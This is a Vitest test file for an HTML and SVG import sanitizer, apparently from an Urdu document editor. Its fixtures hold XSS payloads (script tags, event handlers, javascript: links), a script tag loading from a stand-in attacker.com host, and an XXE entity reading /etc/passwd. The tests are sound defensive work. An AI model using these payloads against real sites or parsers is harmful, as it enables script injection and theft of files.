import { describe, expect, it } from 'vitest';
import { containsExecutableMarkup, sanitizeHtmlMarkup, sanitizeSvgXml } from './sanitizer';
import { importHtml } from './htmlImporter';
import { importSvg } from './svgImporter';

describe('importSecurity', () => {
  it('detects executable markup vectors', () => {
    expect(containsExecutableMarkup('<script>alert(1)</script>')).toBe(true);
    expect(containsExecutableMarkup('<img src="x" onerror="alert(1)">')).toBe(true);
    expect(containsExecutableMarkup('javascript:alert(1)')).toBe(true);
    expect(containsExecutableMarkup('Safe Urdu Text')).toBe(false);
  });

  it('sanitizes malicious HTML inputs by stripping scripts and event handlers', () => {
    const maliciousHtml = `
      <div onclick="evil()">
        <script src="http://attacker.com/xss.js"></script>
        <p onload="evil()">سلام</p>
        <a href="javascript:doBadThings()">Link</a>
      </div>
    `;

    const sanitized = sanitizeHtmlMarkup(maliciousHtml);

    expect(sanitized).not.toContain('<script');
    expect(sanitized).not.toContain('onclick=');
    expect(sanitized).not.toContain('onload=');
    expect(sanitized).not.toContain('javascript:doBadThings()');
  });

  it('sanitizes SVG inputs against XXE entities and script tags', () => {
    const maliciousSvg = `
      <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <svg xmlns="http://www.w3.org/2000/svg">
        <script>alert('XSS')</script>
        <rect x="0" y="0" width="10" height="10" onclick="alert(1)" />
      </svg>
    `;

    const sanitized = sanitizeSvgXml(maliciousSvg);

    expect(sanitized).not.toContain('<!DOCTYPE');
    expect(sanitized).not.toContain('<!ENTITY');
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('onclick=');
  });

  it('ensures HTML importer never returns executable markup', () => {
    const payload = '<h2>Urdu Document</h2><iframe src="evil.html"></iframe><script>eval("alert(1)")</script>';
    const result = importHtml(payload);

    const serialized = JSON.stringify(result.story);
    expect(serialized).not.toContain('iframe');
    expect(serialized).not.toContain('eval');
  });

  it('ensures SVG importer never renders script nodes', () => {
    const payload = '<svg><script>console.log("bad")</script><rect x="0" y="0" width="50" height="50"/></svg>';
    const result = importSvg(payload);

    expect(result.objects.length).toBe(1);
    expect(result.objects[0]!.type).toBe('rectangle');
  });
});
